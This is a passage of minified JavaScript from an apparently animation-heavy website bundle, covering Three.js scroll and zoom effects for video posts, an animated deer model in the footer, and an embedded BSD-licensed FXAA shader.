t=__POSTS__.length-1;t>=0;t--)__POSTS__[t].video.el&&__POSTS__[t].video.el.pause()},onTouchComplete:function(){this.onScrollTo(this.center.index,1,Power3.easeOut);for(var t=__POSTS__.length-1;t>=0;t--)__POSTS__[t].post_id===this.center.post_id?(__POSTS__[t].video.el&&onPlayVideo(__POSTS__[t].video.el),__POSTS__[t].selected=!0):(__POSTS__[t].video.el&&__POSTS__[t].video.el.pause(),__POSTS__[t].selected=!1)},onScrollTo:function(t,e,i){this.onResetTweens(),fakeScroll.onResetTweens();var n=(__POSTS__[t].plane.pos.py+this.copy.y1)/(this.total_height-__WH__)*(fakeScroll.total_height-__WH__);if(isMobileFixed.any)r=TweenLite.to(styleMobile.$body,e,{scrollTo:-n,ease:i}),this.center.tween.push(r);else{var r=TweenLite.to(window,e,{scrollTo:-n,ease:i});this.center.tween.push(r)}},loop:{enable:!0,flag:!1},onLoop:function(){var t=__WT__-(fakeScroll.total_height-__WH__);if(Math.abs(t)<=.5&&-1===mouse.dir)clearTimeout(fakeScroll.timer.end.t),this.loop.flag=!0,this.onResetTweens(),fakeScroll.onResetTweens(),fakeScroll.speed.arr[0]=0,fakeScroll.speed.arr[1]=0,__WIN__?(fakeScroll.body.y=-fakeScroll.speed.dist,fakeScroll.body.py=0):(fakeScroll.body.y=-fakeScroll.speed.dist,fakeScroll.body.py=fakeScroll.body.y/(fakeScroll.total_height-__WH__)),window.scrollTo(0,fakeScroll.body.py*(fakeScroll.total_height-__WH__)),__WT__=fakeScroll.body.py*(fakeScroll.total_height-__WH__);else if(0===__WT__&&1===mouse.dir){clearTimeout(fakeScroll.timer.end.t),this.loop.flag=!0,this.onResetTweens(),fakeScroll.onResetTweens(),fakeScroll.speed.arr[0]=0,fakeScroll.speed.arr[1]=0,__WIN__?(fakeScroll.body.y=fakeScroll.total_height-__WH__,fakeScroll.body.py=fakeScroll.body.y/(fakeScroll.total_height-__WH__)):(fakeScroll.body.y=fakeScroll.total_height-__WH__+fakeScroll.speed.dist,fakeScroll.body.py=fakeScroll.body.y/(fakeScroll.total_height-__WH__));var e=fakeScroll.body.py*(fakeScroll.total_height-__WH__);window.scrollTo(0,e),__WT__=e}else this.loop.flag=!1},splash:{position:{x:-__WH__,y:0,z:__WH__},rotation:{x:.25,y:.25,z:.25},opacity:0,power:0},onSplash:function(t,e,i,n){var r=this;this.__Flag_splash__=!1,this.splash.position.x=-__WH__*n,this.splash.position.y=0,this.splash.position.z=__WH__*n,this.splash.rotation.x=.45*n,this.splash.rotation.y=.45*n,this.splash.rotation.z=.45*n,this.splash.opacity=0,this.splash.power=0,TweenLite.to(this.splash.position,t,{x:0,y:0,z:0,delay:i,ease:e}),TweenLite.to(this.splash,t,{opacity:1,ease:e,delay:i}),TweenLite.to(this.splash,t,{power:1,ease:e,delay:i}),TweenLite.to(this.splash.rotation,t,{x:0,y:0,z:0,delay:i,ease:e,onComplete:function(){r.__Flag_splash__=!0}})},onUpdateForDesktop:function(){this.loop.enable&&!this.zoom.enable&&"home"===__PAGE_TYPE__&&this.onLoop();var t=1-this.zoom.pow;this.stage.position.x=t*(mouse.ax*mouse.back.x*__WW__+__WW__*this.default.stage.offset.x)+(-__WW__*this.default.stage.x+this.zoom.stage.x+this.splash.position.x),this.stage.position.y=t*(-mouse.ay*mouse.back.y*__WH__)+this.copy.y1,this.stage.rotation.y=t*mouse.ax*mouse.back.deg+this.splash.rotation.y,this.stage.position.z=-Math.abs(fakeWheel.speed.pow1*__WH__*.5)*(1-this.zoom.pow)+this.zoom.stage.z+this.splash.position.z,this.stage.rotation.x=this.splash.rotation.x,this.stage.rotation.z=this.splash.rotation.z;for(var e=0;e<__POSTS__.length;e++){var i=__POSTS__[e].plane.mesh,n=__POSTS__[e];if(!i)return!1;n.plane.pos.x=n.plane.pos.px-fakeScroll.body.py*(this.total_width-__WW__),n.plane.pos.y=n.plane.pos.py+fakeScroll.body.py*(this.total_height-__WH__),this.zoom.enable&&(n.plane.pos.x=n.plane.pos.px-this.slideTo.py*(this.total_width-__WW__),n.plane.pos.y=n.plane.pos.py+this.slideTo.py*(this.total_height-__WH__));var r=n.plane.pos.y+this.copy.y1+.5*__WH__+this.height/2+this.padding/2,a=r-__WH__-this.padding/2-this.height-this.padding/2;if(r>0&&a<0){i.material.visible=!0;var o=(n.plane.pos.y+this.copy.y1)/__WH__;i.material.uniforms.cy.value=-1*o*this.splash.power;var s=1-Math.abs(o);switch(__ENV__.mouse?(i.material.uniforms.offsetX.value=t*s*mouse.ax*.1,i.material.uniforms.offsetY.value=t*(o*this.default.offset.y-s*mouse.ay*.1)):i.material.uniforms.offsetY.value=o*this.default.offset.y,i.rotation.z=o*this.default.stage.deg*(1-this.zoom.pow),this.align){case"left":i.position.x=-Math.abs(Math.sin(o*o*this.default.stage.deg)*(this.padding+this.height)*this.default.planes.x)+this.zoom.plane.x;break;case"center":i.position.x=-Math.abs(Math.sin(o*o*this.default.stage.deg)*(this.padding+this.height)*this.default.planes.x)+-n.size.scaled.w/2*(1-this.zoom.pow)+this.zoom.plane.x;break;case"right":i.position.x=-Math.abs(Math.sin(o*o*this.default.stage.deg)*(this.padding+this.height)*this.default.planes.x)+(-n.size.scaled.w+__WW__/2)*(1-this.zoom.pow)+this.zoom.plane.x}i.position.z=this.zoom.plane.z,i.position.y=n.plane.pos.y+this.zoom.plane.y+this.splash.position.y,i.material.uniforms.rgb_shift.value=fakeWheel.speed.pow2*(1/this.height)*150}else i.material.visible=!1;"home"!=__PAGE_TYPE__&&n.post_id!=this.center.post_id&&(i.material.visible=!1)}this.zoom.enable?this.onUpdateZoomAfter():this.onUpdateZoomBefore()},onUpdateForMobile:function(){this.zoom.pow,this.stage.position.x=-__WW__*this.default.stage.x+this.zoom.stage.x,this.stage.position.y=this.copy.y1,this.stage.position.z=0,this.stage.rotation.x=0,this.stage.rotation.y=0,this.stage.rotation.z=0;for(var t=0;t<__POSTS__.length;t++){var e=__POSTS__[t].plane.mesh,i=__POSTS__[t];if(!e)return!1;i.plane.pos.x=i.plane.pos.px-fakeScroll.body.py*(this.total_width-__WW__),i.plane.pos.y=i.plane.pos.py+fakeScroll.body.py*(this.total_height-__WH__);var n=i.plane.pos.y+this.copy.y1+.5*__WH__+this.height/2+this.padding/2,r=n-__WH__-this.padding/2-this.height-this.padding/2;if(n>0&&r<0){e.material.visible=!0,i.is_clone&&(e.material.visible=!1);var a=(i.plane.pos.y+this.copy.y1)/__WH__;Math.abs(a),e.material.uniforms.offsetY.value=a*this.default.offset.y,e.position.x=-Math.abs(Math.sin(a*a*this.default.stage.deg)*(this.padding+this.height)*this.default.planes.x)+-i.size.scaled.w/2,e.position.z=0,e.position.y=i.plane.pos.y}else e.material.visible=!1;"home"!=__PAGE_TYPE__&&i.post_id!=this.center.post_id&&(e.material.visible=!1)}this.zoom.enable||this.onUpdateZoomBefore(),styleMobile.onUpdate()},play:{timer:null,s:100},onUpdateZoomBefore:function(){for(var t=0;t<__POSTS__.length;t++){var e=__POSTS__[t].plane.mesh;if(e.material.uniforms.alpha.value=this.splash.opacity,__POSTS__[t].video.el&&this.__Flag_splash__&&loading.__Flag_complete__)switch(__PAGE_TYPE__){case"home":if(__POSTS__[t].index===this.center.index){if(__POSTS__[t].is_load_meta||(__POSTS__[t].video.el.setAttribute("preload","auto"),__POSTS__[t].is_load_meta=!0),1!=e.material.uniforms.fade.value&&__POSTS__[t].is_loaded_data)for(var i=0;i<__POSTS__.length;i++)if(__POSTS__[t].post_id===__POSTS__[i].post_id){var n=__POSTS__[i].plane.mesh;n.material.uniforms.is_loaded_data.value=1,TweenLite.to(n.material.uniforms.fade,1,{value:1})}}else e.material.visible&&(__POSTS__[t].is_load_meta||(__POSTS__[t].video.el.setAttribute("preload","auto"),__POSTS__[t].is_load_meta=!0),__POSTS__[t].is_loaded_data&&(e.material.uniforms.is_loaded_data.value=1));break;case"single":__POSTS__[t].post_id===this.center.post_id&&fakeScroll.body.y<__WH__*this.zoom.scale?(__POSTS__[t].video.el.pause(),e.material.visible=!0):(__POSTS__[t].video.el.pause(),e.material.visible=!1),1!=e.material.uniforms.fade.value&&__POSTS__[t].is_loaded_data&&(e.material.uniforms.is_loaded_data.value=1,e.material.uniforms.fade.value=1)}}},onUpdateZoomAfter:function(){for(var t=0;t<__POSTS__.length;t++)if(__POSTS__[t].video.el&&this.__Flag_splash__&&loading.__Flag_complete__&&"single"===__PAGE_TYPE__){var e=__POSTS__[t].plane.mesh;__POSTS__[t].index===this.center.index?(fakeScroll.body.y<__WH__*this.zoom.scale?(__MIDSPEC__||this.zoom.ing||styleMenu.__Flag_open_before__||onPlayVideo(__POSTS__[t].video.el),e.material.visible=!0):(__POSTS__[t].video.el.pause(),e.material.visible=!1),1!=e.material.uniforms.fade.value&&__POSTS__[t].is_loaded_data&&(e.material.uniforms.is_loaded_data.value=1,e.material.uniforms.fade.value=1)):(__POSTS__[t].video.el.pause(),e.material.visible=!1)}},onZoomIn:function(t,e,i,n){var r=this,a=this;if(this.zoom.ing=!0,this.zoom.enable=!0,this.center.index=t,this.center.post_id=__POSTS__[t].post_id,n){this.center.post_id=n;for(var o=0;o<__POSTS__.length;o++)__POSTS__[o].post_id===this.center.post_id&&(this.center.index=__POSTS__[o].index)}this.onResetTweens(),fakeScroll.onResetTweens();var s=(__POSTS__[this.center.index].plane.pos.py+this.copy.y1)/(this.total_height-__WH__);this.slideTo.y=s*-(fakeScroll.total_height-__WH__),this.slideTo.py=this.slideTo.y/(fakeScroll.total_height-__WH__),TweenLite.to(this.zoom,e,{pow:1,ease:i,onComplete:function(){a.zoom.ing=!1}}),__POSTS__.forEach((function(t,n){if(t.selected=!1,t.post_id!=a.center.post_id)return!1;t.selected=!0;var o=t.plane.mesh,s=o.scale.x,l=o.scale.y,c=(__WH__,__WH__*t.size.ratio),h=(1-2*a.default.stage.x)/2,u=-__WW__*h+__WW__/2-s/2,d=.5*(__WH__-l);c<__WW__&&(d=1.5*l>=s?.5*(__WH__-l):.5*(__WH__-l)*__WW__/c),TweenLite.to(r.zoom.plane,e,{x:u,z:d*r.zoom.scale,ease:i}),TweenLite.to(o.material.uniforms.opacity,e,{value:a.default.uniforms.to.opacity,ease:i}),TweenLite.to(o.material.uniforms.rgb,e,{value:a.default.uniforms.to.rgb,ease:i}),TweenLite.to(o.material.uniforms.gradient,e,{value:a.default.uniforms.to.gradient,ease:i})}))},autoScroll:!0,autoScrollTimer:null,onZoomOut:function(t,e){var i=this;this.zoom.ing=!0,this.zoom.enable=!1,this.autoScroll=!1,this.onScrollReset(),fakeScroll.onResetTweens(),0===t?(this.zoom.pow=0,this.zoom.ing=!1,__POSTS__.forEach((function(t,e){var n=t.plane.mesh;i.zoom.plane.x=0,i.zoom.plane.z=0,n.material.uniforms.opacity.value=i.default.uniforms.from.opacity,n.material.uniforms.rgb.value=i.default.uniforms.from.rgb,n.material.uniforms.gradient.value=i.default.uniforms.from.gradient,n.material.uniforms.scale.value=i.default.uniforms.from.scale}))):(TweenLite.to(this.zoom,t,{pow:0,ease:e,onComplete:function(){i.zoom.ing=!1}}),__POSTS__.forEach((function(n,r){var a=n.plane.mesh;TweenLite.to(i.zoom.plane,t,{x:0,z:0,ease:e}),TweenLite.to(a.material.uniforms.opacity,t,{value:i.default.uniforms.from.opacity,ease:e}),TweenLite.to(a.material.uniforms.rgb,t,{value:i.default.uniforms.from.rgb,ease:e}),TweenLite.to(a.material.uniforms.gradient,t,{value:i.default.uniforms.from.gradient,ease:e}),TweenLite.to(a.material.uniforms.scale,t,{value:i.default.uniforms.from.scale,ease:e})}))),clearTimeout(i.autoScrollTimer),i.autoScrollTimer=setTimeout((function(){i.autoScroll=!0}),500)}}},function(t,e,i){"use strict";i.r(e),i(4);var n=i(164),r=i.n(n),a=i(165),o=i.n(a);backGL.__SINGLE__={__Flag_ok__:!1,frag:r.a,vert:o.a,once:function(){this.scene=new THREE.Scene,this.camera=new THREE.PerspectiveCamera(90,backGL.width/backGL.height,.1,1e3),this.camera.position.z=backGL.height/2,this.scene.add(this.camera);var t={minFilter:THREE.LinearFilter,magFilter:THREE.LinearFilter,format:THREE.RGBFormat,stencilBuffer:!1};this.fbo=new THREE.WebGLRenderTarget(backGL.width,backGL.height,t),this.fbo.texture.name="SINGLE"},mesh:null,onLoadAssets:function(){},screen:{ratio:0},tFirstView:{el:null,type:"img",tex:null,ratio:0,w:0,h:0,width:0,height:0,d1x:null,d2x:null},onLoadSingleFv:function(){var t=this;if(this.bg_geometry=new THREE.PlaneBufferGeometry(1,1,1),this.bg_material=new THREE.MeshBasicMaterial({visible:!0,transparent:!0,color:"#000"}),this.bg=new THREE.Mesh(this.bg_geometry,this.bg_material),this.bg.scale.set(__WW__,__WH__,1),this.scene.add(this.bg),this.$resource=document.getElementById("js--resource"),this.tFirstView.w=parseInt(this.$resource.dataset.w),this.tFirstView.h=parseInt(this.$resource.dataset.h),this.tFirstView.d1x=this.$resource.dataset.d1x,this.tFirstView.d2x=this.$resource.dataset.d2x,this.tFirstView.el=document.getElementById("single-video"),this.tFirstView.type=this.$resource.dataset.type,this.geometry=new THREE.PlaneBufferGeometry(1,1,1),this.material=new THREE.ShaderMaterial({visible:!0,transparent:!0,uniforms:{tDiffuse:{type:"t",value:null},scale:{value:1},opacity:{value:0},rgb:{value:backGL.__HOME__.default.uniforms.to.rgb},rgb_shift:{value:0},gradient:{value:backGL.__HOME__.default.uniforms.to.gradient}},vertexShader:this.vert,fragmentShader:this.frag,side:THREE.DoubleSide}),this.mesh=new THREE.Mesh(this.geometry,this.material),this.mesh.scale.set(__WW__,__WH__,1),this.scene.add(this.mesh),this.onResize(),this.__Fade_out__=!0,this.__Flag_ok__=!0,"video"===this.tFirstView.type)this.tFirstView.tex=new THREE.VideoTexture(this.tFirstView.el),this.tFirstView.tex.minFilter=THREE.LinearFilter,this.tFirstView.tex.needsUpdate=!0,this.mesh.material.uniforms.tDiffuse.value=this.tFirstView.tex,clearTimeout(t.timer),t.timer=setTimeout((function(){t.tFirstView.el.play(),t.onFadeIn(routeTransition.anim.tr.in.s,routeTransition.anim.tr.in.e)}),500);else{this.tFirstView.el=new Image,this.tFirstView.el.crossOrigin="anonymous";var e=getImageSrc(this.tFirstView.d1x,this.tFirstView.d2x);this.tFirstView.el.src=e,this.tFirstView.el.onload=function(e){t.tFirstView.tex=new THREE.Texture(this),t.tFirstView.tex.minFilter=THREE.LinearFilter,t.tFirstView.tex.needsUpdate=!0,t.mesh.material.uniforms.tDiffuse.value=t.tFirstView.tex,t.onFadeIn(routeTransition.anim.tr.in.s,routeTransition.anim.tr.in.e)}}backGL.onZoomIn()},timer:null,__Fade_out__:!0,onFadeIn:function(t,e){var i=this;this.mesh&&(i.__Fade_out__=!0,TweenLite.to(this.mesh.material.uniforms.opacity,3,{value:backGL.__HOME__.default.uniforms.to.opacity,ease:e,onComplete:function(){i.__Fade_out__=!1}}))},onFadeOut:function(t,e){this.mesh&&(this.__Fade_out__=!0,TweenLite.to(this.mesh.material.uniforms.opacity,t,{value:0,ease:e}))},onUpdate:function(){if(this.__Fade_out__)return!1;this.mesh&&(this.mesh.material.uniforms.rgb_shift.value=fakeWheel.speed.pow2*(1/backGL.height)*150,"video"===this.tFirstView.type&&this.tFirstView.el&&(fakeScroll.body.y<.8*__WH__?this.tFirstView.el.play():this.tFirstView.el.pause()),fakeScroll.body.y<__WH__?this.mesh.material.visible=!0:this.mesh.material.visible=!1)},onResize:function(){var t=backGL.height*backGL.__HOME__.zoom.scale;isMobileFixed.any&&(t=backGL.height),this.tFirstView.ratio=this.tFirstView.w/this.tFirstView.h,this.tFirstView.height=t,this.tFirstView.width=t*this.tFirstView.ratio,this.mesh&&this.mesh.scale.set(this.tFirstView.width,this.tFirstView.height,1),this.bg&&this.bg.scale.set(backGL.width,backGL.height,1),this.camera.aspect=backGL.width/backGL.height,this.camera.position.z=backGL.height/2,this.camera.updateProjectionMatrix()},onDestroy:function(){this.mesh&&(this.mesh.material.visible=!1,this.mesh.material.uniforms.tDiffuse.value=null,this.scene.remove(this.bg),this.bg.material.dispose(),this.bg.geometry.dispose(),this.bg_material.dispose(),this.bg_geometry.dispose(),this.bg.material=null,this.bg.geometry=null,this.bg_material=null,this.bg_geometry=null,this.bg=null,this.scene.remove(this.mesh),this.mesh.material.dispose(),this.mesh.geometry.dispose(),this.material.dispose(),this.geometry.dispose(),this.mesh.material=null,this.mesh.geometry=null,this.material=null,this.geometry=null,this.mesh=null),this.tFirstView.tex&&(this.tFirstView.tex.dispose(),this.tFirstView.tex=null),this.tFirstView.el=null,backGL.renderer.setRenderTarget(null),backGL.renderer.clear()}}},function(t,e,i){"use strict";i.r(e),i(4);var n=i(54);backGL.__FOOTER__={__Flag_ok__:!1,__Flag__stable:!0,__Flag__anim:!0,deer:{p:{x:0,y:0,z:0},r:{x:0,y:0,z:0},s:{x:.03,y:.03,z:.03},s2:3.3},origin:{src:n.a.awsBase+"assets/models/body/gz-deer-look.glb",stage:[new THREE.Group,new THREE.Group],object:[],mixer:[],animations:[],action_stable:[],clock:[new THREE.Clock,new THREE.Clock],__Flag__stable:!1,obj:[],scene:[]},far:900,far_scale:1,once:function(){this.scene=new THREE.Scene;var t=this.far*this.far_scale/30;this.camera=new THREE.PerspectiveCamera(30,backGL.width/backGL.height,.1,900),this.camera.position.z=t,this.scene.add(this.camera);for(var e=0;e<this.origin.stage.length;e++)this.scene.add(this.origin.stage[e]);for(this.deer.r.x=0,this.deer.r.y=125,this.deer.r.z=93,this.deer.p.x=-20*this.deer.s.x*this.far_scale,this.deer.p.y=-110*this.deer.s.y*this.far_scale,this.deer.p.z=0*this.deer.s.z*this.far_scale,e=0;e<this.origin.stage.length;e++)this.origin.stage[e].rotation.x=this.deer.r.x*(Math.PI/180),this.origin.stage[e].rotation.y=this.deer.r.y*(Math.PI/180),this.origin.stage[e].rotation.z=this.deer.r.z*(Math.PI/180),this.origin.stage[e].position.x=this.deer.p.x,this.origin.stage[e].position.y=this.deer.p.y,this.origin.stage[e].position.z=this.deer.p.z,0===e?(this.origin.stage[e].scale.x=this.deer.s.x,this.origin.stage[e].scale.y=this.deer.s.y,this.origin.stage[e].scale.z=this.deer.s.z):(this.origin.stage[e].scale.x=-this.deer.s.x,this.origin.stage[e].scale.y=this.deer.s.y,this.origin.stage[e].scale.z=this.deer.s.z);var i={minFilter:THREE.LinearFilter,magFilter:THREE.LinearFilter,stencilBuffer:!1};this.fbo=new THREE.WebGLRenderTarget(backGL.width,backGL.height,i),this.fbo.texture.name="FOOTER",this.addLight()},onResize:function(){},plane:[],materials:[],addLight:function(){var t=new THREE.AmbientLight(__COL_WHITE__,1.2);this.scene.add(t)},onLoadAssets:function(){if(__ENV__.skip)return!1;var t=this;new THREE.GLTFLoader(loading.footer).load(this.origin.src+__QUERY__,(function(e){var i=e.scene,n=i.children[0],r=e.animations,a=new THREE.AnimationMixer(n);t.origin.mixer.push(a),t.origin.animations.push(r),t.origin.action_stable.push(a.clipAction(r[0])),t.origin.action_stable[0].play(),t.origin.mixer[0].addEventListener("finished",(function(e){t.origin.action_stable[0].play(),t.__Flag__stable=!0})),t.scene.add(i),t.origin.scene.push(i),t.origin.obj.push(n),n.rotation.x=t.deer.r.x*(Math.PI/180),n.rotation.y=t.deer.r.y*(Math.PI/180),n.rotation.z=t.deer.r.z*(Math.PI/180),n.scale.x=t.deer.s2*t.far_scale,n.scale.y=t.deer.s2*t.far_scale,n.scale.z=t.deer.s2*t.far_scale,n.position.x=t.deer.p.x,n.position.y=t.deer.p.y,n.position.z=t.deer.p.z})),new THREE.GLTFLoader(loading.footer).load(this.origin.src+__QUERY__,(function(e){var i=e.scene,n=i.children[0],r=e.animations,a=new THREE.AnimationMixer(n);t.origin.mixer.push(a),t.origin.animations.push(r),t.origin.action_stable.push(a.clipAction(r[0])),t.origin.action_stable[1].play(),t.origin.mixer[1].addEventListener("finished",(function(e){t.origin.action_stable[1].play(),t.__Flag__stable=!0})),t.scene.add(i),t.origin.scene.push(i),t.origin.obj.push(n),n.traverse((function(t){if(t.isMesh){var e=t.material;e.color.r=.03,e.color.g=.03,e.color.b=.03}})),n.rotation.x=t.deer.r.x*(Math.PI/180),n.rotation.y=t.deer.r.y*(Math.PI/180),n.rotation.z=t.deer.r.z*(Math.PI/180),n.scale.x=-t.deer.s2*t.far_scale,n.scale.y=t.deer.s2*t.far_scale,n.scale.z=t.deer.s2*t.far_scale,n.position.x=t.deer.p.x,n.position.y=t.deer.p.y,n.position.z=t.deer.p.z}))},onLoaded:function(){this.__Flag_ok__=!0},onUpdate:function(){for(var t=fakeScroll.total_height/__WH__,e=this.deer.p.y-(1-fakeScroll.body.py)*(.02*__WH__*t),i=0;i<this.origin.stage.length;i++)this.origin.mixer[i]&&(this.origin.mixer[i].update(this.origin.clock[i].getDelta()),this.origin.obj[i].position.x=this.pos.origin.x,this.origin.obj[i].position.y=this.pos.origin.y+e,this.origin.obj[i].position.z=this.pos.origin.z)},chengeAnim:function(t,e,i){if(this.__Flag__stable&&this.__Flag__anim)for(var n=0;n<this.origin.mixer.length;n++)if(this.origin.mixer[n]){this.origin.mixer[n].stopAllAction();var r=this.origin.animations[n],a=this.origin.mixer[n].clipAction(r[t]);i||(a.setLoop(THREE.LoopOnce),a.clampWhenFinished=!0),a.weight=0,TweenLite.to(a,e,{weight:1}),a.play()}this.__Flag__stable=!1},onMouseEnter:function(){this.chengeAnim(1,.7,!1)},onLookAround:function(){this.chengeAnim(1,.7,!1)},onMouseLeave:function(){},pos:{origin:{x:0,y:0,z:0},from:{x:0,y:0,z:0},to:{x:20,y:-5,z:-5}}}},function(t,e,i){"use strict";i.r(e),i(256),i(257),window.frontGL={scene:null,screen:null,__Flag_ok__:!1,__Flag_loaded__:!1,scale:window.devicePixelRatio,rescale:1,once:function(){__SPEC__.score<=8&&!isMobileFixed.any&&(this.scale=Math.min(window.devicePixelRatio,1.5)),this.width=window.innerWidth,this.height=window.innerHeight,this.canvas=document.getElementById("js--gl-front"),this.renderer=new THREE.WebGLRenderer({canvas:this.canvas,alpha:!0,antialias:!0}),this.renderer.setSize(this.width,this.height),this.renderer.setPixelRatio(this.scale),this.renderer.autoClearColor=!1,this.__Flag_ok__=!0},onResize:function(){this.width=window.innerWidth,this.height=window.innerHeight,this.renderer.setSize(this.width,this.height),this.screen&&(this.screen.material.uniforms.resolution.value.x=this.width,this.screen.material.uniforms.resolution.value.y=this.height,this.screen.scale.set(this.width,this.height,1),this.camera.left=-this.width/2,this.camera.right=this.width/2,this.camera.top=this.height/2,this.camera.bottom=-this.height/2,this.camera.updateProjectionMatrix())},onLoaded:function(){},onUpdate:function(){this.screen.material.uniforms.wheel_power.value=Math.abs(fakeWheel.speed.pow1)}}},function(t,e){t.exports='#define GLSLIFY 1\n/**\nBasic FXAA implementation based on the code on geeks3d.com with the\nmodification that the texture2DLod stuff was removed since it\'s\nunsupported by WebGL.\n\n--\n\nFrom:\nhttps://github.com/mitsuhiko/webgl-meincraft\n\nCopyright (c) 2011 by Armin Ronacher.\n\nSome rights reserved.\n\nRedistribution and use in source and binary forms, with or without\nmodification, are permitted provided that the following conditions are\nmet:\n\n    * Redistributions of source code must retain the above copyright\n      notice, this list of conditions and the following disclaimer.\n\n    * Redistributions in binary form must reproduce the above\n      copyright notice, this list of conditions and the following\n      disclaimer in the documentation and/or other materials provided\n      with the distribution.\n\n    * The names of the contributors may not be used to endorse or\n      promote products derived from this software without specific\n      prior written permission.\n\nTHIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS\n"AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT\nLIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR\nA PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT\nOWNER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL,\nSPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT\nLIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,\nDATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY\nTHEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT\n(INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE\nOF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.\n*/\n\n#ifndef FXAA_REDUCE_MIN\n    #define FXAA_REDUCE_MIN   (1.0/ 128.0)\n#endif\n#ifndef FXAA_REDUCE_MUL\n    #define FXAA_REDUCE_MUL   (1.0 / 8.0)\n#endif\n#ifndef FXAA_SPAN_MAX\n    #define FXAA_SPAN_MAX     8.0\n#endif\n\n//optimized version for mobile, where dependent \n//texture reads can be a bottleneck\nvec4 fxaa(sampler2D tex, vec2 fragCoord, vec2 resolution,\n            vec2 v_rgbNW, vec2 v_rgbNE, \n            vec2 v_rgbSW, vec2 v_rgbSE, \n            vec2 v_rgbM) {\n    vec4 color;\n    mediump vec2 inverseVP = vec2(1.0 / resolution.x, 1.0 / resolution.y);\n    vec3 rgbNW = texture2D(tex, v_rgbNW).xyz;\n    vec3 rgbNE = texture2D(tex, v_rgbNE).xyz;\n    vec3 rgbSW = texture2D(tex, v_rgbSW).xyz;\n    vec3 rgbSE = texture2D(tex, v_rgbSE).xyz;\n    vec4 texColor = texture2D(tex, v_rgbM);\n    vec3 rgbM  = texColor.xyz;\n    vec3 luma = vec3(0.299, 0.587, 0.114);\n    float lumaNW = dot(rgbNW, luma);\n    float lumaNE = dot(rgbNE, luma);\n    float lumaSW = dot(rgbSW, luma);\n    float lumaSE = dot(rgbSE, luma);\n    float lumaM  = dot(rgbM,  luma);\n    float lumaMin = min(lumaM, min(min(lumaNW, lumaNE), min(lumaSW, lumaSE)));\n    float lumaMax = max(lumaM, max(max(lumaNW, lumaNE), max(lumaSW, lumaSE)));\n    \n    mediump vec2 dir;\n    dir.x = -((lumaNW + lumaNE) - (lumaSW + lumaSE));\n    dir.y =  ((lumaNW + lumaSW) - (lumaNE + lumaSE));\n    \n    float dirReduce = max((lumaNW + lumaNE + lumaSW + lumaSE) *\n                          (0.25 * FXAA_REDUCE_MUL), FXAA_REDUCE_MIN);\n    \n    float rcpDirMin = 1.0 / (min(abs(dir.x), abs(dir.y)) + dirReduce);\n    dir = min(vec2(FXAA_SPAN_MAX, FXAA_SPAN_MAX),\n              max(vec2(-FXAA_SPAN_MAX, -FXAA_SPAN_MAX),\n              dir * rcpDirMin)) * inverseVP;\n    \n    vec3 rgbA = 0.5 * (\n        texture2D(tex, fragCoord * inverseVP + dir * (1.0 / 3.0 - 0.5)).xyz +\n        texture2D(tex, fragCoord * inverseVP + dir * (2.0 / 3.0 - 0.5)).xyz);\n    vec3 rgbB = rgbA * 0.5 + 0.25 * (\n        texture2D(tex, fragCoord * inverseVP + dir * -0.5).xyz +\n        texture2D(tex, fragCoord * inverseVP + dir * 0.5).xyz);\n\n    float lumaB = dot(rgbB, luma);\n    if ((lumaB < lumaMin) || (lumaB > lumaMax))\n        color = vec4(rgbA, texColor.a);\n    else\n        color = vec4(rgbB, texColor.a);\n    return color;\n}\n\n//To save 9 dependent texture reads, you can compute\n//these in the vertex shader and use the optimized\n//frag.glsl function in your frag shader. \n\n//This is best suited for mobile devices, like iOS.\n\nvoid texcoords(vec2 fragCoord, vec2 resolution,\n\t\t\tout vec2 v_rgbNW, out vec2 v_rgbNE,\n\t\t\tout vec2 v_rgbSW, out vec2 v_rgbSE,\n\t\t\tout vec2 v_rgbM) {\n\tvec2 inverseVP = 1.0 / resolution.xy;\n\tv_rgbNW = (fragCoord + vec2(-1.0, -1.0)) * inverseVP;\n\tv_rgbNE = (fragCoord + vec2(1.0, -1.0)) * inverseVP;\n\tv_rgbSW = (fragCoord + vec2(-1.0, 1.0)) * inverseVP;\n\tv_rgbSE = (fragCoord + vec2(1.0, 1.0)) * inverseVP;\n\tv_rgbM = vec2(fragCoord * inverseVP);\n}\n\nvec4 apply(sampler2D tex, vec2 fragCoord, vec2 resolution) {\n\tmediump vec2 v_rgbNW;\n\tmediump vec2 v_rgbNE;\n\tmediump vec2 v_rgbSW;\n\tmediump vec2 v_rgbSE;\n\tmediump vec2 v_rgbM;\n\n\t//compute the texture coords\n\ttexcoords(fragCoord, resolution, v_rgbNW, v_rgbNE, v_rgbSW, v_rgbSE, v_rgbM);\n\t\n\t//compute FXAA\n\treturn fxaa(tex, fragCoord, resolution, v_rgbNW, v_rgbNE, v_rgbSW, v_rgbSE, v_rgbM);\n}\n\nvarying vec2 vUv;\nuniform sampler2D tLogo;\nuniform vec2 resolution;\n\n//\nuniform float wheel_power;\n\nvoid main() {\n\n\tvec2 fragCoord = vUv * resolution;\n\tvec4 _fxaa = apply( tLogo , fragCoord, resolution );\n\n\t// //\n\t// float _py = sin( vUv.x - 0.5 ) * pow( 1.0 - vUv.y , 2.0 ) * abs(wheel_power) * 2.0;\n\n\t// float uv_mag_x = -_py;\n\t// float uv_mag_y = 0.0;\n\t// float _dx = vUv.x + uv_mag_x;\n\t// float _dy = vUv.y + uv_mag_y;\n\n\t// vec2 uv_displaced = vec2( _dx, _dy );\n\t// vec4 _home = texture2D( tLogo, uv_displaced );\n\n\tgl_FragColor = _fxaa;\n\n}'},function(t,e){t.exports="#define GLSLIFY 1\nvarying vec2 vUv;\nvoid main(){\n\tvUv = uv;\n\tgl_Position = projectionMatrix * modelViewMatrix * 